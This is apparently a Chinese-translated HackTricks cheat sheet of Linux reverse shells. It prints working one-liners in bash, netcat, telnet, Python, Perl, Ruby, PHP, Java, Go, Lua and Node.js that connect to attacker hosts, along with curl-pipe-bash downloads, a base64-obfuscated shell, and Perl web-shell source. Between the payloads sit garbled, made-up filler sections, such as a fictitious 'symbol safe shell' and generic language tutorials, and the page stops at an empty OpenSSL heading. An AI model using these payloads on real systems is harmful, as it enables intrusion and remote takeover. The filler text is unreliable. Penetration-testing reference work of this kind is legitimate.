# Shell - Linux

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在 HackTricks 中**宣传你的公司**吗？或者你想要**获取最新版本的 PEASS 或下载 HackTricks 的 PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass)，或者**关注**我在**推特**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>

**如果你对这些 shell 有任何问题，你可以使用** [**https://explainshell.com/**](https://explainshell.com) **进行查询。**

## 完整 TTY

**一旦你获得了一个反向 shell**[ **阅读这个页面以获取完整的 TTY**](full-ttys.md)**。**

## Bash | sh
```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```
### 安全符号的shell

The symbol safe shell is a type of shell that is designed to handle special characters and symbols in a secure manner. It ensures that these characters are not interpreted as commands or arguments, thus preventing any potential security vulnerabilities.

To use the symbol safe shell, you can simply prefix the command or argument with a backslash (\). This will escape the special characters and symbols, allowing them to be treated as literal characters rather than having any special meaning.

For example, if you want to use a file name that contains spaces, you can use the symbol safe shell to ensure that the spaces are not interpreted as command separators. You can do this by enclosing the file name in quotes and escaping any spaces within the quotes.

```
$ ls "my\ file\ name.txt"
```

In this example, the backslashes before the spaces escape them, allowing the file name to be treated as a single argument.

By using the symbol safe shell, you can prevent unintended command execution or other security issues that may arise from the interpretation of special characters and symbols. It is a good practice to always use the symbol safe shell when dealing with potentially dangerous inputs.
```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```
#### Shell解释

1. **`bash -i`**: 这部分命令启动一个交互式（`-i`）Bash shell。
2. **`>&`**: 这部分命令是将**标准输出**（`stdout`）和**标准错误**（`stderr`）**同时重定向到同一目标**的简写表示法。
3. **`/dev/tcp/<攻击者IP>/<端口>`**: 这是一个特殊的文件，**表示与指定IP地址和端口的TCP连接**。
* 通过**将输出和错误流重定向到该文件**，该命令有效地将交互式shell会话的输出发送到攻击者的机器。
4. **`0>&1`**: 这部分命令将**标准输入（`stdin`）重定向到与标准输出（`stdout`）相同的目标**。

### 创建文件并执行
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```
## 前向Shell

你可能会遇到这样的情况，你在一个Linux机器的Web应用中发现了一个RCE漏洞，但由于Iptables规则或其他类型的过滤，你无法获得一个反向Shell。这个"shell"允许你通过在受害系统内部使用管道来维持一个PTY shell。

你可以在[**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)找到代码。

你只需要修改以下内容：

* 受漏洞主机的URL
* 负载的前缀和后缀（如果有的话）
* 负载的发送方式（头部？数据？额外信息？）

然后，你可以发送命令，甚至使用`upgrade`命令来获得一个完整的PTY（请注意，管道的读写会有大约1.3秒的延迟）。

## Netcat
```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## gsocket

在[https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)中进行检查
```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```
## Telnet

Telnet是一种用于远程登录和管理计算机系统的网络协议。它允许用户通过网络连接到远程主机并执行命令。然而，由于Telnet在传输数据时不加密，因此它存在安全风险。攻击者可以使用网络嗅探工具来截取Telnet会话中的敏感信息，例如用户名和密码。

要使用Telnet连接到远程主机，可以使用以下命令：

```bash
telnet <IP地址> <端口号>
```

默认情况下，Telnet使用23号端口。如果成功连接到远程主机，您将被要求输入用户名和密码。

为了增加Telnet连接的安全性，可以考虑使用SSH（Secure Shell）代替Telnet。SSH提供了加密的远程访问，可以更好地保护敏感信息的传输。

要使用SSH连接到远程主机，可以使用以下命令：

```bash
ssh <用户名>@<IP地址> -p <端口号>
```

默认情况下，SSH使用22号端口。成功连接后，您将被要求输入密码。

请注意，为了使用Telnet或SSH连接到远程主机，您需要确保远程主机已启用相应的服务，并且您具有正确的用户名和密码。
```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## Whois

**攻击者**
```bash
while true; do nc -l <port>; done
```
要发送命令，请将其写下来，按下回车键，然后按下CTRL+D（停止STDIN）

**受害者**
```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```
## Python

Python是一种高级编程语言，广泛用于开发各种应用程序和脚本。它具有简单易学的语法和强大的功能，适用于各种任务。

### Python解释器

Python代码可以通过Python解释器来执行。有多个Python解释器可供选择，包括CPython、Jython、IronPython等。CPython是最常用的解释器，它是用C语言实现的，并且与C语言代码可以很好地集成。

### Python脚本

Python脚本是一系列Python代码的集合，可以通过解释器执行。脚本可以包含变量、函数、类等，可以用于自动化任务、数据处理、网络编程等各种用途。

### Python模块

Python模块是一组相关的Python代码的集合，可以通过导入模块来使用其中的功能。Python标准库提供了大量的模块，用于处理文件、网络、日期时间等常见任务。此外，还有许多第三方模块可供使用，可以通过pip等工具进行安装。

### Python包

Python包是一组相关的模块的集合，可以通过导入包来使用其中的模块。包是一个目录，其中包含一个特殊的`__init__.py`文件，用于标识该目录为一个包。包可以有多层嵌套，可以更好地组织和管理代码。

### Python虚拟环境

Python虚拟环境是一种隔离Python环境的机制，可以在同一台机器上同时管理多个独立的Python环境。虚拟环境可以用于隔离不同项目的依赖关系，避免冲突和混乱。

### Python常用工具

Python有许多常用的工具，用于开发、调试和测试Python代码。其中一些工具包括pip、virtualenv、pylint、pytest等。这些工具可以提高开发效率，确保代码的质量和稳定性。

### Python网络编程

Python具有强大的网络编程能力，可以用于构建各种网络应用。Python提供了socket模块，用于实现网络通信。此外，还有许多第三方库，如requests、urllib等，用于处理HTTP请求和响应。

### Python数据处理

Python在数据处理方面也非常强大。它提供了许多库和工具，用于处理和分析各种数据。其中一些库包括numpy、pandas、matplotlib等。这些库可以帮助我们进行数据清洗、转换、分析和可视化。

### Python安全编程

Python也可以用于编写安全相关的代码。它提供了许多库和工具，用于加密、解密、哈希、认证等安全操作。其中一些库包括cryptography、hashlib、hmac等。这些库可以帮助我们保护数据的安全性和完整性。

### Python Web框架

Python有许多流行的Web框架，用于构建Web应用。其中一些框架包括Django、Flask、Pyramid等。这些框架提供了丰富的功能和工具，可以简化Web开发过程，提高开发效率。

### Python人工智能

Python在人工智能领域也非常受欢迎。它提供了许多库和工具，用于机器学习、深度学习、自然语言处理等任务。其中一些库包括scikit-learn、tensorflow、pytorch等。这些库可以帮助我们构建和训练各种智能模型。

### Python的优势

Python具有许多优势，使其成为一种流行的编程语言。其中一些优势包括简单易学的语法、丰富的库和工具、广泛的应用领域、强大的社区支持等。这些优势使得Python成为许多开发者的首选语言。
```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```
## Perl

Perl是一种通用的脚本编程语言，广泛用于系统管理、网络编程和Web开发。它具有强大的文本处理能力和灵活的语法，使其成为许多黑客和渗透测试人员的首选工具之一。

### Perl反向Shell

Perl反向Shell是一种利用Perl编写的恶意脚本，用于在目标系统上建立反向连接并获取远程访问权限。以下是一个示例Perl反向Shell脚本：

```perl
use Socket;
use FileHandle;

$ip = "攻击者IP";
$port = 攻击者端口;

$shell = "/bin/sh -i";
if (fork()) {
    exit;
}

socket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
if (connect(SOCKET, sockaddr_in($port, inet_aton($ip)))) {
    open(STDIN, ">&SOCKET");
    open(STDOUT, ">&SOCKET");
    open(STDERR, ">&SOCKET");
    system($shell);
    close(STDIN);
    close(STDOUT);
    close(STDERR);
}
```

要使用Perl反向Shell，只需将攻击者的IP地址和端口替换为实际值，并将脚本上传到目标系统上。然后，攻击者可以使用netcat或其他工具连接到目标系统并执行命令。

### Perl Web Shell

Perl Web Shell是一种基于Perl编写的Web后门，用于在受攻击的Web服务器上执行命令和操作文件。以下是一个示例Perl Web Shell脚本：

```perl
#!/usr/bin/perl

use CGI qw(:standard);
use strict;

print header;
print start_html("Perl Web Shell");

if (param()) {
    my $command = param('cmd');
    my $output = `$command`;
    print "<pre>$output</pre>";
}

print "<form method='POST'>";
print "<input type='text' name='cmd'>";
print "<input type='submit' value='Execute'>";
print "</form>";

print end_html;
```

要使用Perl Web Shell，只需将脚本上传到目标Web服务器上，并通过浏览器访问该脚本。然后，攻击者可以在Web界面上输入命令并执行它们。

### Perl漏洞利用

Perl也可以用于利用系统或应用程序中的漏洞。黑客可以编写特定的Perl脚本来利用已知的漏洞，以获取未经授权的访问权限或执行恶意操作。

要利用Perl漏洞，黑客需要了解目标系统或应用程序中存在的漏洞，并编写相应的脚本来利用这些漏洞。这通常需要深入的技术知识和对目标系统的详细分析。

### Perl资源

以下是一些有用的Perl资源，供黑客和渗透测试人员学习和参考：

- [Perl官方网站](https://www.perl.org/)
- [Perl教程](https://learn.perl.org/)
- [Perl模块索引](https://metacpan.org/)
- [Perl黑客工具](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads)
- [Perl漏洞数据库](https://www.cvedetails.com/vulnerability-list/vendor_id-6339/Perl.html)
```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby

Ruby是一种动态、面向对象的编程语言，常用于Web开发。它具有简洁的语法和强大的功能，被广泛用于构建各种应用程序。

### 安装Ruby

要在Linux系统上安装Ruby，可以使用以下命令：

```bash
sudo apt-get install ruby
```

### 运行Ruby脚本

要运行Ruby脚本，可以使用以下命令：

```bash
ruby script.rb
```

### Ruby Shell

Ruby还提供了一个交互式的Shell，可以在其中执行Ruby代码。要启动Ruby Shell，只需在终端中输入`irb`命令。

### Ruby Gems

Ruby Gems是Ruby的包管理器，用于安装和管理Ruby库。要安装一个Gem，可以使用以下命令：

```bash
gem install gem_name
```

### Ruby on Rails

Ruby on Rails是一个流行的Web应用程序框架，用于快速开发高质量的Web应用。要安装Ruby on Rails，可以使用以下命令：

```bash
gem install rails
```

### Ruby文档

Ruby的官方文档提供了详细的参考和教程，可以在以下网址找到：

[https://www.ruby-lang.org/zh/documentation/](https://www.ruby-lang.org/zh/documentation/)
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## PHP

PHP（Hypertext Preprocessor）是一种广泛使用的开源服务器端脚本语言，特别适用于Web开发。它可以嵌入到HTML中，也可以作为独立的脚本运行。PHP语法简单易学，与多种数据库兼容，并且可以与HTML、CSS和JavaScript无缝集成。

### PHP反弹Shell

PHP反弹Shell是一种利用PHP脚本在目标服务器上建立反向连接的技术。通过在目标服务器上运行PHP反弹Shell，黑客可以远程控制服务器并执行各种操作，如文件上传、命令执行和数据泄露。

#### PHP反弹Shell的使用步骤

1. 生成PHP反弹Shell脚本：使用工具或手动编写PHP脚本，以建立与攻击者控制服务器的反向连接。

2. 将PHP反弹Shell上传到目标服务器：将生成的PHP反弹Shell脚本上传到目标服务器，可以使用文件上传漏洞、命令注入等技术。

3. 启动PHP反弹Shell：在目标服务器上执行PHP反弹Shell脚本，建立与攻击者控制服务器的反向连接。

4. 控制目标服务器：一旦建立了反向连接，攻击者可以通过发送命令来控制目标服务器，执行各种操作。

### PHP Web Shell

PHP Web Shell是一种基于Web的界面，用于在目标服务器上执行命令和操作。它通常由黑客上传到目标服务器，然后通过Web浏览器访问。PHP Web Shell提供了一个交互式的界面，可以执行命令、查看文件、修改文件权限等。

#### PHP Web Shell的使用步骤

1. 上传PHP Web Shell：将PHP Web Shell文件上传到目标服务器，可以使用文件上传漏洞、命令注入等技术。

2. 访问PHP Web Shell：通过Web浏览器访问上传的PHP Web Shell文件，打开PHP Web Shell的界面。

3. 执行命令和操作：在PHP Web Shell界面中，可以执行命令、查看文件、修改文件权限等操作。

4. 控制目标服务器：通过PHP Web Shell，黑客可以远程控制目标服务器，执行各种操作。

### PHP一句话木马

PHP一句话木马是一种利用PHP脚本的短语法，以一行代码的形式在目标服务器上执行恶意操作的技术。它通常由黑客上传到目标服务器，并通过Web浏览器访问来执行恶意操作。

#### PHP一句话木马的使用步骤

1. 生成PHP一句话木马：使用工具或手动编写PHP脚本，以一行代码的形式执行恶意操作。

2. 将PHP一句话木马上传到目标服务器：将生成的PHP一句话木马上传到目标服务器，可以使用文件上传漏洞、命令注入等技术。

3. 访问PHP一句话木马：通过Web浏览器访问上传的PHP一句话木马文件，触发恶意操作。

4. 执行恶意操作：一旦访问了PHP一句话木马，黑客可以执行各种恶意操作，如文件操作、命令执行和数据泄露。
```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```
## Java

Java是一种广泛使用的编程语言，常用于开发跨平台的应用程序。它具有简单易学、面向对象、安全可靠等特点。Java程序可以在Java虚拟机（JVM）上运行，这使得它可以在不同的操作系统上执行。

### Java环境配置

要开始使用Java编程，首先需要安装Java开发工具包（JDK）。以下是在Linux系统上配置Java环境的步骤：

1. 检查是否已安装Java：`java -version`。
2. 如果未安装Java，请使用以下命令安装OpenJDK：`sudo apt-get install openjdk-11-jdk`。
3. 配置Java环境变量：
   - 打开`~/.bashrc`文件：`nano ~/.bashrc`。
   - 在文件末尾添加以下行：
     ```
     export JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64
     export PATH=$PATH:$JAVA_HOME/bin
     ```
   - 保存并关闭文件。
4. 更新环境变量：`source ~/.bashrc`。

### 编写和编译Java程序

使用任何文本编辑器编写Java代码，并将其保存为`.java`文件。以下是一个简单的Java程序示例：

```java
public class HelloWorld {
    public static void main(String[] args) {
        System.out.println("Hello, World!");
    }
}
```

要编译Java程序，使用`javac`命令：

```bash
javac HelloWorld.java
```

这将生成一个名为`HelloWorld.class`的字节码文件。

### 运行Java程序

要运行Java程序，使用`java`命令：

```bash
java HelloWorld
```

程序将输出`Hello, World!`。

### Java开发工具

Java有许多开发工具可用于编写、调试和测试Java程序。以下是一些常用的Java开发工具：

- Eclipse：一个功能强大的集成开发环境（IDE），提供代码编辑、调试和测试功能。
- IntelliJ IDEA：另一个流行的Java IDE，具有智能代码完成和重构功能。
- NetBeans：一个开源的Java IDE，支持多种编程语言。

### Java安全性

尽管Java被认为是一种相对安全的编程语言，但仍然存在一些安全风险。以下是一些常见的Java安全问题：

- 输入验证不足：未正确验证用户输入可能导致代码注入和其他安全漏洞。
- 不安全的库和框架：使用不安全的第三方库和框架可能导致安全漏洞。
- 不安全的配置：不正确的配置可能导致敏感信息泄露和其他安全问题。

为了确保Java应用程序的安全性，开发人员应遵循最佳实践，如输入验证、安全编码和安全配置。此外，定期更新Java版本以获取最新的安全修复程序也是很重要的。
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## Ncat

Ncat是一个功能强大的网络工具，用于连接、监听和传输数据。它是Nmap项目的一部分，可以在多个操作系统上使用。Ncat提供了许多有用的功能，包括端口扫描、端口转发、代理和加密通信。

### 基本用法

要使用Ncat，可以在终端中输入以下命令：

```
ncat [options] target port
```

其中，`target`是要连接或监听的主机名或IP地址，`port`是要连接或监听的端口号。

### 连接到远程主机

要连接到远程主机，可以使用以下命令：

```
ncat target port
```

例如，要连接到IP地址为192.168.1.100的主机的端口号为8080的服务，可以使用以下命令：

```
ncat 192.168.1.100 8080
```

### 监听端口

要监听特定端口，可以使用以下命令：

```
ncat -l port
```

例如，要监听本地主机的端口号为1234的服务，可以使用以下命令：

```
ncat -l 1234
```

### 文件传输

Ncat还可以用于文件传输。要将文件从本地主机发送到远程主机，可以使用以下命令：

```
ncat target port < file
```

要将文件从远程主机接收到本地主机，可以使用以下命令：

```
ncat -l port > file
```

### 端口转发

Ncat可以用于端口转发，将流量从一个端口转发到另一个端口。要进行端口转发，可以使用以下命令：

```
ncat -l local_port --sh-exec "ncat target remote_port"
```

例如，要将本地主机的端口号为1234的流量转发到远程主机的端口号为8080，可以使用以下命令：

```
ncat -l 1234 --sh-exec "ncat 192.168.1.100 8080"
```

### 代理

Ncat还可以用作代理服务器。要将Ncat设置为代理服务器，可以使用以下命令：

```
ncat -l local_port --proxy-type proxy_type --proxy proxy_address:proxy_port
```

其中，`proxy_type`是代理类型（如`http`或`socks4`），`proxy_address`是代理服务器的地址，`proxy_port`是代理服务器的端口号。

例如，要将Ncat设置为HTTP代理服务器，可以使用以下命令：

```
ncat -l 8080 --proxy-type http --proxy 192.168.1.100:8888
```

### 加密通信

Ncat支持加密通信，可以使用SSL或TLS协议进行安全通信。要使用加密通信，可以使用以下命令：

```
ncat --ssl target port
```

或者

```
ncat --ssl-cert cert_file --ssl-key key_file target port
```

其中，`cert_file`是SSL证书文件的路径，`key_file`是SSL私钥文件的路径。

例如，要使用SSL协议连接到IP地址为192.168.1.100的主机的端口号为443的服务，可以使用以下命令：

```
ncat --ssl 192.168.1.100 443
```

或者，如果有SSL证书和私钥文件，可以使用以下命令：

```
ncat --ssl-cert cert.pem --ssl-key key.pem 192.168.1.100 443
```

以上是Ncat的一些基本用法和功能。通过灵活使用Ncat，您可以进行各种网络操作，如连接远程主机、监听端口、文件传输、端口转发、代理和加密通信。
```bash
victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
attacker> ncat -v 10.0.0.22 4444 --ssl
```
## Golang

Golang（又称Go）是一种开源的编程语言，由Google开发。它具有简洁、高效和并发性强的特点，适用于构建可靠和高性能的软件。Golang的语法简单易懂，学习曲线较为平缓，因此成为了许多开发者的首选语言之一。

### 安装Golang

要在Linux系统上安装Golang，可以按照以下步骤进行操作：

1. 下载Golang二进制文件：
   ```bash
   wget https://golang.org/dl/go<version>.linux-amd64.tar.gz
   ```

2. 解压缩下载的文件：
   ```bash
   tar -C /usr/local -xzf go<version>.linux-amd64.tar.gz
   ```

3. 配置环境变量：
   ```bash
   export PATH=$PATH:/usr/local/go/bin
   ```

4. 验证安装是否成功：
   ```bash
   go version
   ```

### 编写和运行Golang程序

使用Golang编写程序非常简单。以下是一个简单的示例程序：

```go
package main

import "fmt"

func main() {
    fmt.Println("Hello, World!")
}
```

要运行该程序，可以执行以下命令：

```bash
go run filename.go
```

### 构建可执行文件

如果要构建可执行文件，可以使用以下命令：

```bash
go build filename.go
```

这将生成一个名为`filename`的可执行文件，可以通过以下命令运行：

```bash
./filename
```

### Golang常用工具

Golang提供了许多有用的工具，可以帮助开发者更高效地编写和调试代码。以下是一些常用的Golang工具：

- `go fmt`：格式化代码
- `go vet`：静态代码分析工具
- `go test`：运行测试
- `go get`：下载和安装依赖包
- `go mod`：管理模块依赖

### Golang资源

在学习和开发Golang时，有一些资源可以帮助你更好地理解和应用Golang的特性和技术。以下是一些常用的Golang资源：

- 官方文档：https://golang.org/doc/
- Golang中国：https://golang.google.cn/
- Golang官方博客：https://blog.golang.org/
- Golang Playground：https://play.golang.org/

### 总结

Golang是一种简洁、高效和并发性强的编程语言，适用于构建可靠和高性能的软件。通过安装Golang并使用常用工具，你可以更高效地编写和调试Golang程序。同时，利用Golang资源可以帮助你更好地学习和应用Golang的特性和技术。
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```
## Lua

Lua是一种轻量级的脚本语言，常用于嵌入式系统和游戏开发。它具有简单的语法和高效的执行速度，因此在各种应用中广泛使用。

### Lua Shell

Lua Shell是一个交互式的命令行工具，用于执行Lua脚本和测试代码片段。它提供了一个简单的环境，可以在其中编写和运行Lua代码。

#### 启动Lua Shell

要启动Lua Shell，只需在终端中输入`lua`命令即可。这将打开一个新的交互式会话，您可以在其中输入和执行Lua代码。

```bash
$ lua
Lua 5.3.5  Copyright (C) 1994-2018 Lua.org, PUC-Rio
> 
```

#### 执行Lua代码

在Lua Shell中，您可以直接输入Lua代码并执行它。只需在提示符`>`后输入代码，然后按下回车键即可。

```bash
> print("Hello, Lua!")
Hello, Lua!
```

#### 退出Lua Shell

要退出Lua Shell，只需输入`exit()`或按下`Ctrl + D`即可。

```bash
> exit()
$
```

### Lua脚本文件

除了在Lua Shell中直接执行代码，您还可以将Lua代码保存在脚本文件中，并使用`lua`命令执行该文件。

#### 创建Lua脚本文件

要创建一个Lua脚本文件，只需使用任何文本编辑器创建一个新文件，并将Lua代码保存在其中。例如，创建一个名为`script.lua`的文件，并将以下代码保存在其中：

```lua
print("Hello, Lua script!")
```

#### 执行Lua脚本文件

要执行Lua脚本文件，只需在终端中使用`lua`命令，后跟脚本文件的路径。

```bash
$ lua script.lua
Hello, Lua script!
```

### Lua模块

Lua模块是一组相关的函数和变量的集合，可以在Lua代码中重复使用。模块可以通过`require`函数加载，并在代码中使用。

#### 创建Lua模块

要创建一个Lua模块，只需创建一个新的Lua脚本文件，并在其中定义函数和变量。例如，创建一个名为`mymodule.lua`的文件，并将以下代码保存在其中：

```lua
local mymodule = {}

function mymodule.sayHello()
    print("Hello from my module!")
end

return mymodule
```

#### 使用Lua模块

要使用Lua模块，只需在代码中使用`require`函数加载模块，并使用模块中的函数和变量。

```lua
local mymodule = require("mymodule")

mymodule.sayHello()
```

输出：

```
Hello from my module!
```

### 总结

Lua是一种简单而高效的脚本语言，常用于嵌入式系统和游戏开发。您可以使用Lua Shell来交互式地执行Lua代码，也可以将Lua代码保存在脚本文件中并执行。此外，Lua模块提供了一种组织和重用代码的方式。
```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## NodeJS

NodeJS 是一个基于 Chrome V8 引擎的 JavaScript 运行时环境，用于构建快速、可扩展的网络应用程序。它允许开发人员使用 JavaScript 在服务器端运行代码，而不仅仅局限于浏览器环境。

### 安装 NodeJS

要安装 NodeJS，可以按照以下步骤进行操作：

1. 访问 NodeJS 官方网站（https://nodejs.org/）。
2. 下载适用于您操作系统的最新版本的 NodeJS。
3. 执行安装程序，并按照提示进行安装。

### 创建 NodeJS 项目

要创建一个新的 NodeJS 项目，可以按照以下步骤进行操作：

1. 打开终端或命令提示符。
2. 导航到要创建项目的目录。
3. 运行以下命令来初始化项目：

```bash
npm init
```

4. 按照提示输入项目的名称、版本号等信息。

### 运行 NodeJS 项目

要运行 NodeJS 项目，可以按照以下步骤进行操作：

1. 打开终端或命令提示符。
2. 导航到项目的根目录。
3. 运行以下命令来启动项目：

```bash
node app.js
```

其中，`app.js` 是项目的入口文件。

### 使用 NPM 安装依赖

NPM（Node Package Manager）是 NodeJS 的包管理工具，可以用于安装、管理和升级项目的依赖。

要使用 NPM 安装依赖，可以按照以下步骤进行操作：

1. 打开终端或命令提示符。
2. 导航到项目的根目录。
3. 运行以下命令来安装依赖：

```bash
npm install <package-name>
```

其中，`<package-name>` 是要安装的依赖包的名称。

### 调试 NodeJS 项目

要调试 NodeJS 项目，可以按照以下步骤进行操作：

1. 在项目的入口文件中添加调试器语句：

```javascript
debugger;
```

2. 打开终端或命令提示符。
3. 导航到项目的根目录。
4. 运行以下命令来启动调试器：

```bash
node inspect app.js
```

5. 在浏览器中打开 Chrome DevTools（输入 `chrome://inspect`）。
6. 单击“Open dedicated DevTools for Node”链接。
7. 在 DevTools 中，单击“Sources”选项卡。
8. 在左侧的文件树中，找到并单击项目的入口文件。
9. 在入口文件中的调试器语句处设置断点。
10. 刷新浏览器，开始调试。

### 总结

NodeJS 是一个强大的 JavaScript 运行时环境，可用于构建服务器端应用程序。通过安装 NodeJS、创建项目、运行项目、安装依赖和调试项目，您可以开始使用 NodeJS 开发高效、可扩展的应用程序。
```javascript
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(8080, "10.17.26.64", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```
## OpenSSL

攻击者（Kali）
```bash
